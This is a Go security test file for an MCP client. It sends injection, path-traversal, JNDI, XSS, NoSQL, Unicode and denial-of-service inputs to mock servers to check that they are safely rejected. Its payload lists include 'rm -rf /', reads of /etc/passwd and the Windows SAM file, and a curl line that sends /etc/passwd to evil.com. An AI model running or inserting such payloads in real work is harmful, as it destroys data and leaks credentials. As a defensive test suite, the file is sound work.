package mcp

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/standardbeagle/mcp-tui/internal/config"
)

// TestInputValidationSecurity tests security aspects of input validation
func TestInputValidationSecurity(t *testing.T) {
	t.Run("Command_Injection_In_Tool_Parameters", func(t *testing.T) {
		// Test various command injection payloads
		injectionPayloads := []string{
			"; rm -rf /",
			"$(rm -rf /)",
			"`rm -rf /`",
			"| cat /etc/passwd",
			"&& curl http://evil.com/steal?data=$(cat /etc/passwd)",
			"'; DROP TABLE users; --",
			"\"; system('rm -rf /'); \"",
			"${jndi:ldap://evil.com/exploit}",
			"../../../etc/passwd",
			"\\..\\..\\..\\windows\\system32\\config\\sam",
		}

		for _, payload := range injectionPayloads {
			t.Run(fmt.Sprintf("Payload_%s", strings.ReplaceAll(payload[:min(len(payload), 20)], " ", "_")), func(t *testing.T) {
				server := createMockServerWithToolExecution(t, func(toolName string, args map[string]interface{}) (interface{}, error) {
					// Check if any arguments contain the injection payload
					for key, value := range args {
						if strVal, ok := value.(string); ok {
							if strings.Contains(strVal, payload) {
								// Log the attempt but don't actually execute anything dangerous
								t.Logf("Injection attempt detected in parameter %s: %s", key, strVal)
								
								// Return safe response
								return map[string]interface{}{
									"result": "Parameter contained suspicious content",
									"sanitized": true,
								}, nil
							}
						}
					}
					
					return map[string]interface{}{"result": "Tool executed safely"}, nil
				})
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				if err != nil {
					t.Skipf("Connection failed: %v", err)
				}
				defer service.Disconnect()

				// Try to execute tool with injection payload
				result, err := service.CallTool(ctx, CallToolRequest{
					Name: "test-tool",
					Arguments: map[string]interface{}{
						"command":   payload,
						"parameter": payload,
						"filename":  payload,
					},
				})

				// Tool execution should not fail catastrophically
				// The implementation should sanitize or safely handle the input
				if err != nil {
					t.Logf("Tool execution failed safely: %v", err)
				} else {
					require.NotNil(t, result, "Result should not be nil")
					t.Logf("Tool execution completed: %+v", result)
				}
			})
		}
	})

	t.Run("Path_Traversal_In_Resource_URIs", func(t *testing.T) {
		pathTraversalPayloads := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"file:///etc/passwd",
			"file://c:/windows/system32/config/sam",
			"../../../../../../proc/self/environ",
			"....//....//....//etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%252F..%252F..%252Fetc%252Fpasswd",
			"\\\\server\\share\\sensitive",
			"/proc/self/fd/0",
		}

		for _, payload := range pathTraversalPayloads {
			t.Run(fmt.Sprintf("Path_%s", strings.ReplaceAll(payload[:min(len(payload), 20)], "/", "_")), func(t *testing.T) {
				server := createMockServerWithResources(t, func(uri string) (interface{}, error) {
					// Check for path traversal attempts
					if strings.Contains(uri, "..") || 
					   strings.Contains(uri, "%2F") || 
					   strings.Contains(uri, "%252F") ||
					   strings.Contains(uri, "\\\\") ||
					   strings.Contains(uri, "/proc/") ||
					   strings.Contains(uri, "/etc/") ||
					   strings.Contains(uri, "c:/windows") {
						t.Logf("Path traversal attempt detected: %s", uri)
						return nil, fmt.Errorf("access denied: invalid path")
					}
					
					return map[string]interface{}{
						"content": "Safe resource content",
						"uri":     uri,
					}, nil
				})
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				if err != nil {
					t.Skipf("Connection failed: %v", err)
				}
				defer service.Disconnect()

				// Try to access resource with traversal payload
				contents, err := service.ReadResource(ctx, payload)
				
				// Should either fail safely or return sanitized content
				if err != nil {
					assert.Contains(t, err.Error(), "access denied", "Should deny access to dangerous paths")
				} else {
					assert.NotNil(t, contents, "If successful, should return safe content")
					t.Logf("Resource access completed safely")
				}
			})
		}
	})

	t.Run("JSON_Injection_Attacks", func(t *testing.T) {
		jsonInjectionPayloads := []string{
			`{"__proto__": {"isAdmin": true}}`,
			`{"constructor": {"prototype": {"isAdmin": true}}}`,
			`"\\u0000\\u0001\\u0002"`,
			`"\"><script>alert('xss')</script>"`,
			`"'; eval('malicious code'); '"`,
			`{"$where": "this.credits == this.debits"}`,
			`{"$gt": ""}`,
			`{"$ne": null}`,
		}

		for _, payload := range jsonInjectionPayloads {
			t.Run(fmt.Sprintf("JSON_%d", len(payload)), func(t *testing.T) {
				server := createMockServerWithToolExecution(t, func(toolName string, args map[string]interface{}) (interface{}, error) {
					// Tool should handle malicious JSON safely
					return map[string]interface{}{
						"received_args": args,
						"safe": true,
					}, nil
				})
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				if err != nil {
					t.Skipf("Connection failed: %v", err)
				}
				defer service.Disconnect()

				// Parse the payload as JSON to simulate injection
				var injectedData interface{}
				if err := json.Unmarshal([]byte(payload), &injectedData); err == nil {
					result, err := service.CallTool(ctx, CallToolRequest{
						Name: "test-tool",
						Arguments: map[string]interface{}{
							"data": injectedData,
						},
					})

					// Should handle injection safely
					if err != nil {
						t.Logf("JSON injection safely rejected: %v", err)
					} else {
						require.NotNil(t, result, "Result should not be nil")
						t.Logf("JSON injection handled safely")
					}
				}
			})
		}
	})

	t.Run("Unicode_Security_Issues", func(t *testing.T) {
		unicodeAttacks := []string{
			"admin\u0000", // Null byte injection
			"../../etc/passwd\u0000.txt", // Null byte path traversal
			"\u202E\u0040\u0040malicious", // Right-to-left override
			"\uFEFFmalicious", // Byte order mark
			"\u0020\u00A0\u2000\u2001", // Various space characters
			"normal\u200Bhidden\u200Ctext", // Zero-width characters
			"\u0001\u0002\u0003\u0004", // Control characters
		}

		for _, attack := range unicodeAttacks {
			t.Run(fmt.Sprintf("Unicode_Attack_%d", len(attack)), func(t *testing.T) {
				server := createMockServerWithToolExecution(t, func(toolName string, args map[string]interface{}) (interface{}, error) {
					// Check for suspicious Unicode patterns
					for key, value := range args {
						if strVal, ok := value.(string); ok {
							// Check for null bytes
							if strings.Contains(strVal, "\u0000") {
								return nil, fmt.Errorf("null byte detected in %s", key)
							}
							
							// Check for control characters
							for _, r := range strVal {
								if r < 32 && r != '\t' && r != '\n' && r != '\r' {
									t.Logf("Control character detected: U+%04X", r)
								}
							}
						}
					}
					
					return map[string]interface{}{"result": "Unicode handled safely"}, nil
				})
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				if err != nil {
					t.Skipf("Connection failed: %v", err)
				}
				defer service.Disconnect()

				result, err := service.CallTool(ctx, CallToolRequest{
					Name: "test-tool",
					Arguments: map[string]interface{}{
						"text": attack,
					},
				})

				// Should handle Unicode attacks safely
				if err != nil {
					t.Logf("Unicode attack safely rejected: %v", err)
				} else {
					require.NotNil(t, result, "Result should not be nil")
					t.Logf("Unicode attack handled safely")
				}
			})
		}
	})
}

// TestProtocolSecurityVulnerabilities tests MCP protocol-specific security issues
func TestProtocolSecurityVulnerabilities(t *testing.T) {
	t.Run("Malicious_Server_Responses", func(t *testing.T) {
		maliciousResponses := []struct {
			name     string
			response interface{}
		}{
			{
				"Oversized_Tool_List",
				map[string]interface{}{
					"tools": generateLargeToolList(10000), // Very large tool list
				},
			},
			{
				"Recursive_JSON_Bomb",
				generateJSONBomb(10), // Recursive structure
			},
			{
				"Malicious_Tool_Schema",
				map[string]interface{}{
					"tools": []interface{}{
						map[string]interface{}{
							"name": "evil-tool",
							"inputSchema": map[string]interface{}{
								"type": "object",
								"properties": generateDeepProperties(100), // Very deep nesting
							},
						},
					},
				},
			},
		}

		for _, tc := range maliciousResponses {
			t.Run(tc.name, func(t *testing.T) {
				server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
					w.Header().Set("Content-Type", "application/json")
					
					if strings.Contains(r.URL.Path, "tools/list") {
						json.NewEncoder(w).Encode(tc.response)
						return
					}
					
					// Default initialization response
					json.NewEncoder(w).Encode(map[string]interface{}{
						"protocolVersion": "2024-11-05",
						"serverInfo": map[string]interface{}{
							"name":    "malicious-server",
							"version": "1.0.0",
						},
						"capabilities": map[string]interface{}{},
					})
				}))
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				if err != nil {
					t.Skipf("Connection failed: %v", err)
				}
				defer service.Disconnect()

				// Try to list tools - should handle malicious response safely
				tools, err := service.ListTools(ctx)
				
				if err != nil {
					t.Logf("Malicious response safely rejected: %v", err)
				} else {
					t.Logf("Malicious response handled, got %d tools", len(tools))
					// Verify reasonable limits
					assert.Less(t, len(tools), 1000, "Tool list should be limited to reasonable size")
				}
			})
		}
	})

	t.Run("Protocol_Version_Attacks", func(t *testing.T) {
		maliciousVersions := []string{
			"../../../etc/passwd",
			"\x00\x01\x02",
			strings.Repeat("A", 10000),
			"1.0; rm -rf /",
			"<script>alert('xss')</script>",
			"999999.999999.999999",
		}

		for _, version := range maliciousVersions {
			t.Run(fmt.Sprintf("Version_%s", version[:min(len(version), 20)]), func(t *testing.T) {
				server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
					w.Header().Set("Content-Type", "application/json")
					json.NewEncoder(w).Encode(map[string]interface{}{
						"protocolVersion": version,
						"serverInfo": map[string]interface{}{
							"name":    "version-attack-server",
							"version": "1.0.0",
						},
						"capabilities": map[string]interface{}{},
					})
				}))
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				// Should reject malicious protocol versions
				if strings.Contains(version, "/") || 
				   strings.Contains(version, "<") || 
				   len(version) > 100 ||
				   strings.Contains(version, "\x00") {
					assert.Error(t, err, "Should reject malicious protocol version: %s", version)
				}
			})
		}
	})

	t.Run("Resource_URI_Security", func(t *testing.T) {
		maliciousURIs := []string{
			"file:///etc/passwd",
			"file://c:/windows/system32/config/sam",
			"http://evil.com/steal?data=",
			"ftp://evil.com/upload",
			"ldap://evil.com/inject",
			"javascript:alert('xss')",
			"data:text/html,<script>alert('xss')</script>",
			"\\\\evil.com\\share\\malware.exe",
		}

		for _, uri := range maliciousURIs {
			t.Run(fmt.Sprintf("URI_%s", strings.ReplaceAll(uri[:min(len(uri), 20)], "/", "_")), func(t *testing.T) {
				server := createMockServerWithResources(t, func(requestedURI string) (interface{}, error) {
					// Should validate URI schemes and reject dangerous ones
					if strings.HasPrefix(requestedURI, "file://") ||
					   strings.HasPrefix(requestedURI, "javascript:") ||
					   strings.HasPrefix(requestedURI, "data:") ||
					   strings.Contains(requestedURI, "evil.com") {
						return nil, fmt.Errorf("dangerous URI scheme blocked: %s", requestedURI)
					}
					
					return map[string]interface{}{
						"content": "Safe content",
					}, nil
				})
				defer server.Close()

				service := NewService()
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()

				connConfig := &config.ConnectionConfig{
					Type: config.TransportHTTP,
					URL:  server.URL,
				}

				err := service.Connect(ctx, connConfig)
				if err != nil {
					t.Skipf("Connection failed: %v", err)
				}
				defer service.Disconnect()

				contents, err := service.ReadResource(ctx, uri)
				
				// Should reject dangerous URIs
				assert.Error(t, err, "Should reject dangerous URI: %s", uri)
				assert.Nil(t, contents, "Should not return content for dangerous URI")
			})
		}
	})
}

// TestDenialOfServiceProtection tests protection against DoS attacks
func TestDenialOfServiceProtection(t *testing.T) {
	t.Run("Resource_Exhaustion_Protection", func(t *testing.T) {
		// Test protection against various resource exhaustion attacks
		
		// Very large response test
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			
			if strings.Contains(r.URL.Path, "tools/list") {
				// Generate huge response
				w.Write([]byte(`{"tools":[`))
				for i := 0; i < 100000; i++ {
					if i > 0 {
						w.Write([]byte(","))
					}
					w.Write([]byte(fmt.Sprintf(`{"name":"tool%d","description":"Tool %d"}`, i, i)))
					
					// Flush periodically to simulate streaming
					if i%1000 == 0 {
						if f, ok := w.(http.Flusher); ok {
							f.Flush()
						}
					}
				}
				w.Write([]byte(`]}`))
				return
			}
			
			// Default response
			json.NewEncoder(w).Encode(map[string]interface{}{
				"protocolVersion": "2024-11-05",
				"serverInfo":      map[string]interface{}{"name": "dos-test", "version": "1.0.0"},
				"capabilities":    map[string]interface{}{},
			})
		}))
		defer server.Close()

		service := NewService()
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		connConfig := &config.ConnectionConfig{
			Type: config.TransportHTTP,
			URL:  server.URL,
		}

		err := service.Connect(ctx, connConfig)
		if err != nil {
			t.Skipf("Connection failed: %v", err)
		}
		defer service.Disconnect()

		// Try to list tools with huge response
		start := time.Now()
		tools, err := service.ListTools(ctx)
		elapsed := time.Since(start)

		// Should either limit response size or timeout gracefully
		if err != nil {
			t.Logf("Large response rejected: %v", err)
		} else {
			t.Logf("Large response handled: %d tools in %v", len(tools), elapsed)
			assert.Less(t, elapsed, 10*time.Second, "Should not take too long")
		}
	})

	t.Run("Connection_Flood_Protection", func(t *testing.T) {
		// Test rapid connection attempts
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{
				"protocolVersion": "2024-11-05",
				"serverInfo":      map[string]interface{}{"name": "flood-test", "version": "1.0.0"},
				"capabilities":    map[string]interface{}{},
			})
		}))
		defer server.Close()

		// Try many rapid connections
		const numConnections = 50
		var successCount, failCount int

		for i := 0; i < numConnections; i++ {
			service := NewService()
			ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
			
			connConfig := &config.ConnectionConfig{
				Type: config.TransportHTTP,
				URL:  server.URL,
			}

			err := service.Connect(ctx, connConfig)
			if err == nil {
				successCount++
				service.Disconnect()
			} else {
				failCount++
			}
			cancel()
		}

		t.Logf("Connection flood test: %d successes, %d failures", successCount, failCount)
		
		// Some connections should succeed (server should handle reasonable load)
		assert.Greater(t, successCount, 0, "Some connections should succeed")
	})
}

// Helper functions for test data generation

func generateLargeToolList(count int) []interface{} {
	tools := make([]interface{}, count)
	for i := 0; i < count; i++ {
		tools[i] = map[string]interface{}{
			"name":        fmt.Sprintf("tool_%d", i),
			"description": fmt.Sprintf("Generated tool number %d with some description text", i),
		}
	}
	return tools
}

func generateJSONBomb(depth int) map[string]interface{} {
	if depth <= 0 {
		return map[string]interface{}{"end": true}
	}
	
	return map[string]interface{}{
		"level": depth,
		"nested": map[string]interface{}{
			"a": generateJSONBomb(depth - 1),
			"b": generateJSONBomb(depth - 1),
			"c": generateJSONBomb(depth - 1),
		},
	}
}

func generateDeepProperties(depth int) map[string]interface{} {
	if depth <= 0 {
		return map[string]interface{}{
			"type": "string",
		}
	}
	
	return map[string]interface{}{
		"type": "object",
		"properties": map[string]interface{}{
			fmt.Sprintf("level_%d", depth): generateDeepProperties(depth - 1),
		},
	}
}

func createMockServerWithToolExecution(t *testing.T, toolHandler func(string, map[string]interface{}) (interface{}, error)) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		
		if strings.Contains(r.URL.Path, "tools/call") || r.URL.Query().Get("method") == "tools/call" {
			var req struct {
				Name      string                 `json:"name"`
				Arguments map[string]interface{} `json:"arguments"`
			}
			if err := json.NewDecoder(r.Body).Decode(&req); err == nil {
				result, err := toolHandler(req.Name, req.Arguments)
				if err != nil {
					json.NewEncoder(w).Encode(map[string]interface{}{
						"error": err.Error(),
					})
				} else {
					json.NewEncoder(w).Encode(map[string]interface{}{
						"content": []interface{}{
							map[string]interface{}{
								"type": "text",
								"text": fmt.Sprintf("%v", result),
							},
						},
					})
				}
			}
			return
		}
		
		if strings.Contains(r.URL.Path, "tools/list") || r.URL.Query().Get("method") == "tools/list" {
			json.NewEncoder(w).Encode(map[string]interface{}{
				"tools": []interface{}{
					map[string]interface{}{
						"name":        "test-tool",
						"description": "A test tool for security testing",
						"inputSchema": map[string]interface{}{
							"type": "object",
							"properties": map[string]interface{}{
								"command":   map[string]interface{}{"type": "string"},
								"parameter": map[string]interface{}{"type": "string"},
								"filename":  map[string]interface{}{"type": "string"},
								"text":      map[string]interface{}{"type": "string"},
								"data":      map[string]interface{}{"type": "string"},
							},
						},
					},
				},
			})
			return
		}
		
		// Default initialization response
		json.NewEncoder(w).Encode(map[string]interface{}{
			"protocolVersion": "2024-11-05",
			"serverInfo": map[string]interface{}{
				"name":    "security-test-server",
				"version": "1.0.0",
			},
			"capabilities": map[string]interface{}{},
		})
	}))
}

func createMockServerWithResources(t *testing.T, resourceHandler func(string) (interface{}, error)) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		
		if strings.Contains(r.URL.Path, "resources/read") || r.URL.Query().Get("method") == "resources/read" {
			uri := r.URL.Query().Get("uri")
			if uri == "" {
				var req struct {
					URI string `json:"uri"`
				}
				json.NewDecoder(r.Body).Decode(&req)
				uri = req.URI
			}
			
			result, err := resourceHandler(uri)
			if err != nil {
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"error": err.Error(),
				})
			} else {
				json.NewEncoder(w).Encode(result)
			}
			return
		}
		
		// Default initialization response
		json.NewEncoder(w).Encode(map[string]interface{}{
			"protocolVersion": "2024-11-05",
			"serverInfo": map[string]interface{}{
				"name":    "resource-test-server",
				"version": "1.0.0",
			},
			"capabilities": map[string]interface{}{},
		})
	}))
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}